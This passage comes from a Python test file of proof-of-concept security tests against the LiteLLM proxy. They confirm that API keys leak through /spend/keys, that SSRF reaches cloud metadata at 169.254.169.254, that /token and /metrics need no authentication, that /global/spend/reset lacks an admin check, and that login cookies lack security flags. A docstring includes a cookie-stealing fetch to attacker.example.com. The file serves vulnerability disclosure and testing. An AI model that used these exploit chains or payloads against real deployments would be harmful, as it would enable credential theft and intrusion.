            user_id="attacker-user",
            user_role=LitellmUserRoles.INTERNAL_USER,
        )

        fake_proxy_server = _make_proxy_server_module(mock_prisma)
        with patch.dict(sys.modules, {"litellm.proxy.proxy_server": fake_proxy_server}):
            result = await _check_user_info_v2_access(
                user_api_key_dict=attacker_auth,
                target_user_id="victim-user",
            )

        assert result is None, (
            f"v2 access check must return None (deny) for cross-user INTERNAL_USER request, "
            f"got {result!r}"
        )


@pytest.mark.asyncio
class TestSpendKeysLeaksAllKeys:
    """
    PoC tests proving the /spend/keys endpoint leaks all API keys to any authenticated user.

    Vulnerability description:
        The ``spend_key_fn()`` endpoint in ``spend_management_endpoints.py`` (lines 34-66)
        fetches ALL keys from the database with no filtering by caller identity.
        Authentication is enforced via ``dependencies=[Depends(user_api_key_auth)]`` at
        the route level, but any valid API key passes that check — including the lowest-
        privilege ``INTERNAL_USER`` role.

        Once past the auth check, the function calls
        ``prisma_client.get_data(table_name="key", query_type="find_all")`` which
        returns every key in the database regardless of owner, team, or role.

        The function signature does not include a ``user_api_key_dict`` parameter,
        so it structurally CANNOT perform per-caller filtering — the caller's identity
        is simply not available inside the function body.

    Severity: High - Credential Disclosure (All API Keys)
    Status: CONFIRMED ACTIVE
    """

    async def test_non_admin_gets_all_keys(self):
        """
        Proves that calling ``spend_key_fn()`` returns all keys with no filtering.

        Exploit:
            GET /spend/keys
            Authorization: Bearer sk-any-valid-key

        Any authenticated call returns the full contents of the
        ``LiteLLM_VerificationToken`` table — keys belonging to every user and team.

        Impact:
            An attacker with any valid API key can exfiltrate all API keys in the
            system.  Combined with the pass-the-hash attack (TestPassTheHashMasterKey),
            they can immediately escalate to master-key privileges.

        Severity: High - Credential Disclosure
        """
        # Keys belonging to three different users — all returned indiscriminately
        user_a_key = MagicMock()
        user_a_key.token = "hashed-key-user-a"
        user_a_key.user_id = "user-a"

        user_b_key = MagicMock()
        user_b_key.token = "hashed-key-user-b"
        user_b_key.user_id = "user-b"

        user_c_key = MagicMock()
        user_c_key.token = "hashed-key-user-c"
        user_c_key.user_id = "user-c"

        all_keys = [user_a_key, user_b_key, user_c_key]

        mock_prisma = MagicMock()
        mock_prisma.get_data = AsyncMock(return_value=all_keys)

        fake_proxy_server = _make_proxy_server_module(mock_prisma)
        with patch.dict(sys.modules, {"litellm.proxy.proxy_server": fake_proxy_server}):
            result = await spend_key_fn()

        assert result is not None
        assert len(result) == 3, (
            f"All 3 keys must be returned with no filtering, got {len(result)}"
        )
        returned_users = {k.user_id for k in result}
        assert returned_users == {"user-a", "user-b", "user-c"}, (
            f"Keys from all users must be returned, got {returned_users!r}"
        )

    async def test_no_role_check_in_function(self):
        """
        Structural proof that ``spend_key_fn`` cannot perform authorization.

        Uses ``inspect`` to verify:
        1. The function has no ``user_api_key_dict`` parameter — the caller's identity
           is not available inside the function body.
        2. The function source contains no role checks (no ``user_role``, no
           ``PROXY_ADMIN``, no ``user_api_key_dict`` references).

        This is architectural evidence that the endpoint is incapable of enforcing
        per-caller access control, regardless of what logic might be added later.
        The fix requires changing the function signature to accept ``user_api_key_dict``
        and adding filtering logic.

        Severity: High - Credential Disclosure (structural)
        """
        sig = inspect.signature(spend_key_fn)
        assert "user_api_key_dict" not in sig.parameters, (
            f"spend_key_fn must not have a user_api_key_dict parameter — "
            f"confirming the caller identity is structurally unavailable. "
            f"Parameters found: {list(sig.parameters.keys())}"
        )

        # Unwrap if the decorator uses @wraps, otherwise use the function directly
        underlying_fn = getattr(spend_key_fn, "__wrapped__", spend_key_fn)
        source = inspect.getsource(underlying_fn)

        assert "user_role" not in source, (
            "spend_key_fn source must not contain 'user_role' — no role check is performed"
        )
        assert "PROXY_ADMIN" not in source, (
            "spend_key_fn source must not contain 'PROXY_ADMIN' — no admin check is performed"
        )
        assert "user_api_key_dict" not in source, (
            "spend_key_fn source must not reference 'user_api_key_dict' — "
            "the caller's identity is not used for filtering"
        )


@pytest.mark.asyncio
class TestMCPOAuthMetadataSSRF:
    """
    PoC tests proving SSRF in MCP OAuth metadata discovery (Vulnerability 7).

    Vulnerability description:
        The MCP OAuth discovery chain in ``MCPServerManager`` follows RFC 9728 to
        discover authorization server metadata.  When a client connects to an MCP
        server, the proxy issues an unauthenticated GET to the server URL.  If the
        server responds with a 401 and a ``WWW-Authenticate`` header containing a
        ``resource_metadata`` URL, the proxy fetches that URL with no validation.

        A malicious MCP server can return:
            WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/latest/meta-data/"

        The proxy will then fetch the cloud instance metadata endpoint, trust the
        JSON response as OAuth metadata, and store an attacker-controlled URL as
        ``token_url``.  Any subsequent token exchange will POST credentials to that
        internal URL.

    Attack chain:
        1. Attacker registers a malicious MCP server URL.
        2. Proxy calls _descovery_metadata(server_url) — issues GET to server.
        3. Server returns 401 + WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/..."
        4. Proxy calls _fetch_oauth_metadata_from_resource("http://169.254.169.254/...")
           — no SSRF check, issues GET to cloud metadata service.
        5. Metadata response returns {"authorization_servers": ["http://169.254.169.254/auth"]}
        6. Proxy calls _fetch_single_authorization_server_metadata("http://169.254.169.254/auth")
        7. Response returns {"token_endpoint": "http://169.254.169.254/token", ...}
        8. MCPOAuthMetadata is stored with token_url = "http://169.254.169.254/token"
        9. Next /token call POSTs OAuth credentials to the internal metadata service.

    Severity: High - SSRF / Cloud Metadata Credential Exfiltration
    Status: CONFIRMED ACTIVE
    """

    async def test_www_authenticate_header_parsed_to_internal_url(self):
        """
        Proves the parser extracts attacker-controlled internal URLs with no validation.

        Exploit:
            WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/latest/meta-data/iam/security-credentials/role"

        The parser simply extracts the ``resource_metadata`` parameter value and returns
        it as a URL to be fetched — no allowlist, no private-IP check, no scheme check.

        Impact:
            Any string accepted as ``resource_metadata`` will be fetched.  An attacker
            controlling an MCP server can direct the proxy to query any URL reachable
            from the proxy host, including cloud metadata services, internal APIs, and
            SSRF-blocked endpoints.

        Severity: High - SSRF
        Status: CONFIRMED ACTIVE
        """
        manager = object.__new__(MCPServerManager)

        cloud_metadata_url = (
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
        )
        header_value = f'Bearer resource_metadata="{cloud_metadata_url}"'

        resource_metadata_url, scopes = manager._parse_www_authenticate_header(
            header_value
        )

        assert resource_metadata_url == cloud_metadata_url, (
            f"Parser must extract the raw resource_metadata URL with no validation. "
            f"Expected {cloud_metadata_url!r}, got {resource_metadata_url!r}"
        )
        assert scopes is None, "No scopes expected in this header"

    async def test_fetch_oauth_metadata_ssrf_to_cloud_metadata(self):
        """
        Proves the proxy issues an outbound HTTP GET to an attacker-controlled internal URL.

        Exploit:
            Call _fetch_oauth_metadata_from_resource("http://169.254.169.254/latest/meta-data/")

        The function calls get_async_httpx_client and issues client.get(resource_metadata_url)
        with no SSRF check.  The response is parsed as trusted OAuth metadata.

        Impact:
            The proxy will contact the cloud metadata service and trust its JSON response
            as a list of authorization servers.  An attacker can point the proxy at any
            internal endpoint that returns JSON with an "authorization_servers" key.

        Severity: High - SSRF
        Status: CONFIRMED ACTIVE
        """
        manager = object.__new__(MCPServerManager)

        cloud_metadata_url = "http://169.254.169.254/latest/meta-data/"
        fake_metadata_response = {
            "authorization_servers": ["http://10.0.0.1/auth"]
        }

        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_response.json = MagicMock(return_value=fake_metadata_response)

        mock_client = AsyncMock()
        mock_client.get = AsyncMock(return_value=mock_response)

        mock_httpx_client = MagicMock(return_value=mock_client)

        with patch(
            "litellm.proxy._experimental.mcp_server.mcp_server_manager.get_async_httpx_client",
            mock_httpx_client,
        ):
            authorization_servers, scopes = (
                await manager._fetch_oauth_metadata_from_resource(cloud_metadata_url)
            )

        mock_client.get.assert_called_once_with(cloud_metadata_url)

        assert authorization_servers == ["http://10.0.0.1/auth"], (
            f"Attacker-controlled authorization server URL must be trusted. "
            f"Got {authorization_servers!r}"
        )

    async def test_full_discovery_chain_ssrf(self):
        """
        Proves the full SSRF chain: crafted WWW-Authenticate -> stored internal token_url.

        Exploit:
            Call _descovery_metadata("https://evil.example.com/mcp") where the server
            responds with a 401 and a WWW-Authenticate header pointing to the cloud
            metadata service.

        The full chain:
            1. GET https://evil.example.com/mcp -> 401 + WWW-Authenticate with SSRF URL
            2. GET http://169.254.169.254/latest/meta-data/ -> {"authorization_servers": [...]}
            3. GET http://169.254.169.254/auth/.well-known/... -> {"token_endpoint": "..."}
            4. MCPOAuthMetadata stored with token_url = "http://169.254.169.254/token"

        Impact:
            The proxy now treats http://169.254.169.254/token as the legitimate OAuth
            token endpoint.  Any /token exchange will POST client credentials to this
            internal address, leaking them to the cloud metadata service or any
            attacker-controlled internal endpoint.

        Severity: High - SSRF / Credential Exfiltration
        Status: CONFIRMED ACTIVE
        """
        manager = object.__new__(MCPServerManager)

        internal_token_url = "http://169.254.169.254/token"
        internal_auth_url = "http://169.254.169.254/authorize"
        internal_auth_server = "http://169.254.169.254/auth"

        # Fake 401 response with WWW-Authenticate pointing to cloud metadata
        fake_401_response = MagicMock()
        fake_401_response.status_code = 401
        fake_401_response.headers = {
            "WWW-Authenticate": (
                'Bearer resource_metadata="http://169.254.169.254/latest/meta-data/"'
            )
        }

        # First call: raise HTTPStatusError with the 401 response
        ssrf_http_error = httpx.HTTPStatusError(
            "401 Unauthorized",
            request=MagicMock(),
            response=fake_401_response,
        )

        # Second call (metadata fetch): return authorization_servers pointing to internal
        metadata_response = MagicMock()
        metadata_response.raise_for_status = MagicMock()
        metadata_response.json = MagicMock(
            return_value={"authorization_servers": [internal_auth_server]}
        )

        # Third call (auth server metadata): return token + authorization endpoints
        auth_server_response = MagicMock()
        auth_server_response.raise_for_status = MagicMock()
        auth_server_response.json = MagicMock(
            return_value={
                "token_endpoint": internal_token_url,
                "authorization_endpoint": internal_auth_url,
            }
        )

        call_count = 0

        async def _dispatch_get(url: str, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                # Initial discovery call to the evil MCP server
                raise ssrf_http_error
            elif call_count == 2:
                # Metadata fetch to cloud metadata URL
                return metadata_response
            else:
                # Auth server metadata fetch
                return auth_server_response

        mock_client = AsyncMock()
        mock_client.get = _dispatch_get

        mock_httpx_client = MagicMock(return_value=mock_client)

        with patch(
            "litellm.proxy._experimental.mcp_server.mcp_server_manager.get_async_httpx_client",
            mock_httpx_client,
        ):
            result = await manager._descovery_metadata(
                server_url="https://evil.example.com/mcp"
            )

        assert result is not None, (
            "Discovery chain must return metadata — not None — for a valid chain response"
        )
        assert result.token_url == internal_token_url, (
            f"token_url must be the attacker-controlled internal URL. "
            f"Expected {internal_token_url!r}, got {result.token_url!r}"
        )

    async def test_no_ssrf_validation_in_fetch_metadata(self):
        """
        Structural proof: SSRF protection is absent from the fetch functions.

        Uses inspect.getsource() to verify that neither
        ``_fetch_oauth_metadata_from_resource`` nor
        ``_fetch_single_authorization_server_metadata`` contains any call to
        ``validate_url``, ``safe_get``, or ``async_safe_get``.

        These are the standard SSRF-prevention helpers used elsewhere in LiteLLM.
        Their absence proves there is no structural barrier to the proxy fetching
        arbitrary internal URLs.

        Severity: High - SSRF (structural proof)
        Status: CONFIRMED ACTIVE
        """
        fetch_source = inspect.getsource(
            MCPServerManager._fetch_oauth_metadata_from_resource
        )
        single_source = inspect.getsource(
            MCPServerManager._fetch_single_authorization_server_metadata
        )

        for func_name, source in [
            ("_fetch_oauth_metadata_from_resource", fetch_source),
            ("_fetch_single_authorization_server_metadata", single_source),
        ]:
            assert "validate_url" not in source, (
                f"{func_name} must not call validate_url — SSRF protection is absent"
            )
            assert "safe_get" not in source, (
                f"{func_name} must not call safe_get — SSRF protection is absent"
            )
            assert "async_safe_get" not in source, (
                f"{func_name} must not call async_safe_get — SSRF protection is absent"
            )


@pytest.mark.asyncio
class TestUnauthenticatedTokenEndpointSSRF:
    """
    PoC tests proving the unauthenticated /token endpoint + token_url SSRF (Vulnerability 8).

    Vulnerability description:
        The ``/token`` and ``/{mcp_server_name}/token`` POST endpoints in
        ``discoverable_endpoints.py`` (lines 589-636) have no authentication dependency.
        Any unauthenticated client can call the endpoint with arbitrary form data.

        The endpoint calls ``exchange_token_with_server()`` which POSTs the provided
        credentials to ``mcp_server.token_url`` with no SSRF validation.  Combined with
        Vulnerability 7 (SSRF in metadata discovery), an attacker can:

        1. Register or trick the proxy into storing an internal URL as ``token_url``.
        2. Call ``POST /token`` without any auth header.
        3. The proxy POSTs the supplied ``code`` and ``client_id`` to the internal URL.

        This is a two-vector attack: no authentication on the endpoint + no SSRF check
        on the outbound POST.

    Severity: High - Unauthenticated SSRF / Credential Relay
    Status: CONFIRMED ACTIVE
    """

    async def test_token_endpoint_has_no_auth_dependency(self):
        """
        Proves the /token route has no user_api_key_auth dependency.

        Inspects the FastAPI router from discoverable_endpoints to verify that neither
        the ``/token`` route nor the ``/{mcp_server_name}/token`` route lists
        ``user_api_key_auth`` as a dependency.

        Impact:
            Any unauthenticated HTTP client can POST to /token with no API key or
            Bearer token.  The endpoint will process the request and relay credentials
            to the configured token_url without challenging the caller.

        Severity: High - Unauthenticated Endpoint
        Status: CONFIRMED ACTIVE
        """
        token_routes = [
            route
            for route in mcp_discoverable_router.routes
            if hasattr(route, "path") and "token" in route.path  # type: ignore[union-attr]
        ]

        assert len(token_routes) > 0, (
            "At least one /token route must exist in the discoverable_endpoints router"
        )

        for route in token_routes:
            # Check route-level dependencies
            route_deps = getattr(route, "dependencies", [])
            dep_callables = [
                d.dependency for d in route_deps if hasattr(d, "dependency")
            ]
            assert user_api_key_auth not in dep_callables, (
                f"Route {route.path!r} must NOT have user_api_key_auth as a dependency — "  # type: ignore[union-attr]
                "confirming the endpoint is unauthenticated"
            )

            # Check endpoint-level dependant.dependencies (FastAPI internal)
            dependant = getattr(route, "dependant", None)
            if dependant is not None:
                inner_deps = getattr(dependant, "dependencies", [])
                inner_callables = [
                    d.call for d in inner_deps if hasattr(d, "call")
                ]
                assert user_api_key_auth not in inner_callables, (
                    f"Route {route.path!r} must not have user_api_key_auth in dependant.dependencies"  # type: ignore[union-attr]
                )

    async def test_unauthenticated_caller_can_reach_token_endpoint(self):
        """
        Proves unauthenticated callers can trigger an outbound POST to token_url.

        Exploit:
            Call exchange_token_with_server() directly with a fake MCPServer whose
            token_url is a cloud metadata URL.  Assert the mock httpx client receives
            a POST to that internal URL.

        This simulates an unauthenticated caller sending:
            POST /token
            Content-Type: application/x-www-form-urlencoded
            grant_type=authorization_code&client_id=evil-server&code=anything

        The proxy would forward this to mcp_server.token_url with no validation.

        Impact:
            Unauthenticated callers can relay arbitrary OAuth codes to any URL the
            proxy can reach, including cloud metadata services and internal APIs.

        Severity: High - Unauthenticated SSRF
        Status: CONFIRMED ACTIVE
        """
        from litellm.types.mcp_server.mcp_server_manager import MCPServer

        internal_token_url = "http://169.254.169.254/latest/api/token"

        fake_server = MCPServer(
            server_id="evil-server-id",
            name="evil-server",
            transport="http",
            token_url=internal_token_url,
            client_id="evil-server",
        )

        # Build a minimal fake Request (no auth header)
        scope = {
            "type": "http",
            "method": "POST",
            "path": "/token",
            "query_string": b"",
            "headers": [],
            "scheme": "http",
            "server": ("testserver", 80),
            "root_path": "",
        }
        fake_request = Request(scope=scope)

        posted_url: list = []

        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_response.json = MagicMock(
            return_value={
                "access_token": "stolen-token",
                "token_type": "Bearer",
                "expires_in": 3600,
            }
        )

        async def _capture_post(url: str, **kwargs):
            posted_url.append(url)
            return mock_response

        mock_client = AsyncMock()
        mock_client.post = _capture_post

        mock_httpx_client = MagicMock(return_value=mock_client)

        with patch(
            "litellm.proxy._experimental.mcp_server.discoverable_endpoints.get_async_httpx_client",
            mock_httpx_client,
        ):
            await exchange_token_with_server(
                request=fake_request,
                mcp_server=fake_server,
                grant_type="authorization_code",
                code="attacker-auth-code",
                redirect_uri=None,
                client_id="evil-server",
                client_secret=None,
                code_verifier=None,
                refresh_token=None,
                scope=None,
            )

        assert len(posted_url) == 1, (
            f"exchange_token_with_server must POST exactly once, got {len(posted_url)} calls"
        )
        assert posted_url[0] == internal_token_url, (
            f"Proxy must POST credentials to the internal cloud metadata URL. "
            f"Expected {internal_token_url!r}, got {posted_url[0]!r}"
        )

    async def test_token_url_not_ssrf_validated(self):
        """
        Structural proof: no SSRF validation in exchange_token_with_server.

        Uses inspect.getsource() on ``exchange_token_with_server`` to verify it
        contains no call to ``validate_url``, ``safe_get``, or ``async_safe_get``.

        The function calls ``async_client.post(mcp_server.token_url, ...)`` directly
        with no URL validation, confirming SSRF protection is structurally absent.

        Severity: High - SSRF (structural proof)
        Status: CONFIRMED ACTIVE
        """
        source = inspect.getsource(exchange_token_with_server)

        assert "validate_url" not in source, (
            "exchange_token_with_server must not call validate_url — SSRF protection is absent"
        )
        assert "safe_get" not in source, (
            "exchange_token_with_server must not call safe_get — SSRF protection is absent"
        )
        assert "async_safe_get" not in source, (
            "exchange_token_with_server must not call async_safe_get — SSRF protection is absent"
        )


class TestUnauthenticatedMetricsEndpoint:
    """
    PoC tests proving the /metrics Prometheus endpoint is mounted with zero
    authentication and exposes sensitive PII labels (Vulnerability 9).

    Vulnerability description:
        ``PrometheusLogger._mount_metrics_endpoint()`` calls ``app.mount("/metrics",
        metrics_app)`` with no authentication middleware or dependency.  The debug log
        message explicitly says "no authentication", confirming the developers knew the
        endpoint was unprotected.

        Once reachable, the Prometheus metrics expose labels defined in
        ``UserAPIKeyLabelNames`` that include PII: hashed API keys, user e-mail
        addresses, team identifiers, API base URLs, end-user IDs, and key aliases.
        Any network-adjacent observer can scrape the /metrics endpoint and exfiltrate
        this PII without supplying any credentials.

    Severity: High - Unauthenticated PII Disclosure
    Status: CONFIRMED ACTIVE
    """

    def test_metrics_endpoint_mounted_without_auth(self):
        """
        Proves the /metrics endpoint is mounted with no authentication.

        Exploit:
            GET /metrics  (no Authorization header)

        Uses ``inspect.getsource`` on ``_mount_metrics_endpoint`` to verify:
        1. The source contains ``app.mount("/metrics", metrics_app)`` — it is mounted.
        2. The source does NOT contain ``user_api_key_auth``, ``Depends``, or any
           authentication reference — there is no auth gate.
        3. The log string ``"no authentication"`` is present, confirming the developers
           knew the endpoint was unprotected.

        Impact:
            Any unauthenticated client with network access to the proxy port can scrape
            ``/metrics`` and retrieve all Prometheus time-series data, including PII
            labels defined in ``UserAPIKeyLabelNames``.

        Severity: High - Unauthenticated Endpoint
        Status: CONFIRMED ACTIVE
        """
        try:
            from litellm.integrations.prometheus import PrometheusLogger
        except ImportError:
            pytest.skip("prometheus_client not installed")

        source = inspect.getsource(PrometheusLogger._mount_metrics_endpoint)

        assert 'app.mount("/metrics", metrics_app)' in source, (
            "Source must contain app.mount('/metrics', metrics_app) — endpoint is mounted"
        )
        assert "user_api_key_auth" not in source, (
            "Source must NOT contain 'user_api_key_auth' — no authentication is present"
        )
        assert "Depends" not in source, (
            "Source must NOT contain 'Depends' — no FastAPI auth dependency is present"
        )
        assert "no authentication" in source, (
            "Source must contain the 'no authentication' log string — "
            "confirming the developers documented the unprotected state"
        )

    def test_metrics_exposes_sensitive_labels(self):
        """
        Proves the /metrics endpoint exposes PII in its Prometheus labels.

        ``UserAPIKeyLabelNames`` defines the set of label names attached to every
        Prometheus counter and histogram emitted by the LiteLLM proxy.  Each of the
        following labels leaks sensitive information to any /metrics scraper:

        - ``hashed_api_key``  — unique identifier for each API key (linkable to user)
        - ``user_email``      — user PII, directly identifiable
        - ``team``            — organisation structure disclosure
        - ``api_base``        — provider endpoint URLs, reveals backend infrastructure
        - ``end_user``        — end-user identifier passed by the caller
        - ``api_key_alias``   — human-readable key name, may include account info

        Impact:
            A single unauthenticated scrape of /metrics leaks the above PII for every
            API call made through the proxy.  Combined with the unprotected mount
            proven in ``test_metrics_endpoint_mounted_without_auth``, this constitutes
            a complete unauthenticated PII disclosure vulnerability.

        Severity: High - PII Leakage via Unauthenticated Prometheus Labels
        Status: CONFIRMED ACTIVE
        """
        label_values = {member.value for member in UserAPIKeyLabelNames}

        assert "hashed_api_key" in label_values, (
            "UserAPIKeyLabelNames must include 'hashed_api_key' — "
            "leaks a unique fingerprint of every API key to /metrics scrapers"
        )
        assert "user_email" in label_values, (
            "UserAPIKeyLabelNames must include 'user_email' — "
            "directly identifiable PII exposed on every metric data point"
        )
        assert "team" in label_values, (
            "UserAPIKeyLabelNames must include 'team' — "
            "organisation structure and team membership is disclosed"
        )
        assert "api_base" in label_values, (
            "UserAPIKeyLabelNames must include 'api_base' — "
            "backend provider endpoint URLs leaked, revealing infrastructure"
        )
        assert "end_user" in label_values, (
            "UserAPIKeyLabelNames must include 'end_user' — "
            "caller-supplied end-user identifier is attached to every metric"
        )
        assert "api_key_alias" in label_values, (
            "UserAPIKeyLabelNames must include 'api_key_alias' — "
            "human-readable key name may contain account or role information"
        )


class TestGlobalSpendResetMissingAdminGate:
    """
    PoC tests proving the /global/spend/reset endpoint accepts any authenticated
    user — there is no admin role check (Vulnerability 10).

    Vulnerability description:
        The ``global_spend_reset()`` function in ``spend_management_endpoints.py``
        is decorated with ``dependencies=[Depends(user_api_key_auth)]``, meaning any
        valid API key passes authentication.  However, the function signature has no
        ``user_api_key_dict`` parameter, so the caller's role is structurally
        unavailable inside the function body.

        The docstring says "ADMIN ONLY / MASTER KEY Only Endpoint", but no admin check
        is performed.  Any authenticated user can call the endpoint and zero the spend
        counters for ALL API keys and ALL teams across the entire LiteLLM installation.

    Severity: High - Missing Authorization (Privilege Escalation / Destructive Action)
    Status: CONFIRMED ACTIVE
    """

    def test_no_admin_dependency_on_route(self):
        """
        Structural proof that the route has authentication but no admin gate.

        Exploit:
            POST /global/spend/reset
            Authorization: Bearer sk-any-valid-key  (INTERNAL_USER role sufficient)

        Uses ``inspect`` to verify:
        1. ``router.routes`` contains the ``/global/spend/reset`` route with at least
           one dependency (``user_api_key_auth``) — authentication IS present.
        2. The route-level dependencies do NOT include any admin check function.
        3. ``inspect.signature(global_spend_reset)`` has no ``user_api_key_dict``
           parameter — the function structurally cannot access the caller's role.
        4. ``inspect.getsource(global_spend_reset)`` contains no ``user_role``,
           ``PROXY_ADMIN``, or ``_is_admin_view_safe`` — no admin check in the body.

        Impact:
            Any user who can obtain a valid LiteLLM API key (e.g. via the /spend/keys
            IDOR in Vulnerability 6) can POST to /global/spend/reset and zero the spend
            for every key and team, bypassing budget limits and audit controls.

        Severity: High - Missing Authorization
        Status: CONFIRMED ACTIVE
        """
        reset_routes = [
            route
            for route in spend_mgmt_router.routes
            if hasattr(route, "path") and route.path == "/global/spend/reset"  # type: ignore[union-attr]
        ]

        assert len(reset_routes) == 1, (
            f"Expected exactly one /global/spend/reset route, found {len(reset_routes)}"
        )

        route = reset_routes[0]
        route_deps = getattr(route, "dependencies", [])
        assert len(route_deps) > 0, (
            "/global/spend/reset must have at least one dependency (user_api_key_auth) — "
            "authentication is present but no admin check"
        )

        dep_callables = [d.dependency for d in route_deps if hasattr(d, "dependency")]
        assert user_api_key_auth in dep_callables, (
            "user_api_key_auth must be a route-level dependency — authentication exists"
        )

        sig = inspect.signature(global_spend_reset)
        assert "user_api_key_dict" not in sig.parameters, (
            f"global_spend_reset must not have a user_api_key_dict parameter — "
            f"caller's role is structurally unavailable. "
            f"Parameters found: {list(sig.parameters.keys())}"
        )

        source = inspect.getsource(global_spend_reset)
        assert "user_role" not in source, (
            "global_spend_reset source must not contain 'user_role' — no role check is performed"
        )
        assert "PROXY_ADMIN" not in source, (
            "global_spend_reset source must not contain 'PROXY_ADMIN' — no admin check is performed"
        )
        assert "_is_admin_view_safe" not in source, (
            "global_spend_reset source must not reference '_is_admin_view_safe' — "
            "no admin verification helper is called"
        )

    @pytest.mark.asyncio
    async def test_non_admin_can_reset_all_spend(self):
        """
        Proves that calling ``global_spend_reset()`` with a mocked DB zeroes all spend.

        Exploit:
            POST /global/spend/reset  (any valid API key, no admin role required)

        The function takes no arguments — it cannot distinguish admin from non-admin.
        This test calls it directly with a mocked ``prisma_client`` and asserts that
        ``update_many`` is called on both ``litellm_verificationtoken`` and
        ``litellm_teamtable`` with ``data={"spend": 0.0}, where={}``.

        Impact:
            Any authenticated user can zero all spend counters for all API keys and all
            teams.  This erases budget tracking, enables bypass of exhausted budgets,
            and constitutes a destructive action affecting the entire LiteLLM installation.

        Severity: High - Missing Authorization / Destructive Action
        Status: CONFIRMED ACTIVE
        """
        mock_db = MagicMock()
        mock_db.litellm_verificationtoken = MagicMock()
        mock_db.litellm_verificationtoken.update_many = AsyncMock(return_value=None)
        mock_db.litellm_teamtable = MagicMock()
        mock_db.litellm_teamtable.update_many = AsyncMock(return_value=None)

        mock_prisma = MagicMock()
        mock_prisma.db = mock_db

        fake_proxy_server = _make_proxy_server_module(mock_prisma)
        with patch.dict(sys.modules, {"litellm.proxy.proxy_server": fake_proxy_server}):
            result = await global_spend_reset()

        mock_db.litellm_verificationtoken.update_many.assert_called_once_with(
            data={"spend": 0.0}, where={}
        )
        mock_db.litellm_teamtable.update_many.assert_called_once_with(
            data={"spend": 0.0}, where={}
        )

        assert result is not None, "global_spend_reset must return a response"
        assert result.get("status") == "success", (
            f"Response must indicate success — any authenticated caller zeroed all spend. "
            f"Got: {result!r}"
        )


class TestLoginCookieMissingSecurityFlags:
    """
    PoC tests proving the login endpoints set cookies without httponly, secure, or
    samesite flags (Vulnerability 11).

    Vulnerability description:
        Three login endpoints in ``proxy_server.py`` call ``response.set_cookie(key="token",
        value=jwt_token)`` with no security flags:

        - ``/login``           (line ~11607)
        - ``/v2/login``        (line ~11659)
        - ``/v3/login/exchange`` (line ~11827)

        Without ``httponly=True``, JavaScript running in the browser can read the JWT
        from ``document.cookie``.  Any XSS vulnerability — in the LiteLLM UI or any
        third-party script loaded by it — can exfiltrate the session token.

        Without ``secure=True``, the cookie is transmitted over plain HTTP connections,
        enabling session theft via network interception (e.g. on a shared network).

        Without ``samesite=``, the cookie is sent on cross-site requests, enabling
        CSRF attacks that use the victim's session without their consent.

    Severity: High - Session Hijacking via XSS / Network Interception / CSRF
    Status: CONFIRMED ACTIVE
    """

    def test_set_cookie_calls_lack_security_flags(self):
        """
        Static proof that all ``set_cookie`` calls in the login functions lack flags.

        Exploit:
            1. Inject JavaScript via any XSS vector in the LiteLLM UI.
            2. Read ``document.cookie`` — the JWT session token is accessible because
               ``httponly`` is absent.
            3. Exfiltrate the token to an attacker-controlled server.
            4. Replay the token to gain full admin access to the proxy.

        Reads ``proxy_server.py`` with ``pathlib.Path`` and locates every line
        containing ``set_cookie(``.  For each such line asserts:
        - ``httponly`` is absent
        - ``secure`` is absent
        - ``samesite`` is absent

        Impact:
            Any XSS in the dashboard results in immediate, permanent session token theft
            for every user who logs in while the attacker's script is active.

        Severity: High - XSS Session Hijacking
        Status: CONFIRMED ACTIVE
        """
        proxy_server_path = pathlib.Path(__file__).parent.parent.parent.parent.parent / "litellm" / "proxy" / "proxy_server.py"
        source_lines = proxy_server_path.read_text(encoding="utf-8").splitlines()

        set_cookie_lines = [
            (line_no + 1, line)
            for line_no, line in enumerate(source_lines)
            if "set_cookie(" in line
        ]

        assert len(set_cookie_lines) > 0, (
            "proxy_server.py must contain at least one set_cookie() call in the login functions"
        )

        for line_no, line in set_cookie_lines:
            assert "httponly" not in line.lower(), (
                f"Line {line_no}: set_cookie call must NOT contain 'httponly' — "
                f"this would indicate the vulnerability is fixed. Line: {line.strip()!r}"
            )
            assert "secure" not in line.lower(), (
                f"Line {line_no}: set_cookie call must NOT contain 'secure' — "
                f"this would indicate the vulnerability is fixed. Line: {line.strip()!r}"
            )
            assert "samesite" not in line.lower(), (
                f"Line {line_no}: set_cookie call must NOT contain 'samesite' — "
                f"this would indicate the vulnerability is fixed. Line: {line.strip()!r}"
            )

    def test_cookie_security_flags_absent_from_all_login_endpoints(self):
        """
        Detailed proof: all three login endpoint ``set_cookie`` calls lack security flags.

        Reads ``proxy_server.py`` and extracts the ``set_cookie`` calls from the three
        login function blocks.  Asserts each call is missing ``httponly=True``,
        ``secure=True``, and ``samesite=`` parameters.

        Login endpoints checked:
        - ``/login``             — redirect-based flow (line ~11607)
        - ``/v2/login``          — JSON response flow (line ~11659)
        - ``/v3/login/exchange`` — single-use code exchange (line ~11827)

        XSS impact:
            Without ``httponly=True``, any JavaScript injected via XSS can execute:

                fetch('https://attacker.example.com/steal?token=' + document.cookie)

            and exfiltrate the JWT to the attacker.  The attacker can then replay the
            JWT to gain the full permissions of the victim's session — including PROXY_ADMIN
            if the victim is an administrator.

        Severity: High - XSS Session Token Theft / CSRF
        Status: CONFIRMED ACTIVE
        """
        proxy_server_path = pathlib.Path(__file__).parent.parent.parent.parent.parent / "litellm" / "proxy" / "proxy_server.py"
        source_text = proxy_server_path.read_text(encoding="utf-8")
        source_lines = source_text.splitlines()

        login_set_cookie_lines = [
            (line_no + 1, line)
            for line_no, line in enumerate(source_lines)
            if "set_cookie(" in line and "token" in line
        ]

        assert len(login_set_cookie_lines) >= 3, (
            f"Expected at least 3 set_cookie calls with 'token' in proxy_server.py "
            f"(one per login endpoint), found {len(login_set_cookie_lines)}"
        )

        for line_no, line in login_set_cookie_lines:
            stripped = line.strip()
            assert "httponly=True" not in stripped, (
                f"Line {line_no}: set_cookie must NOT have httponly=True — "
                f"JavaScript can read the JWT from document.cookie. Line: {stripped!r}"
            )
            assert "secure=True" not in stripped, (
                f"Line {line_no}: set_cookie must NOT have secure=True — "
                f"cookie is transmitted over plain HTTP. Line: {stripped!r}"
            )
            assert "samesite=" not in stripped.lower(), (
                f"Line {line_no}: set_cookie must NOT have samesite= — "
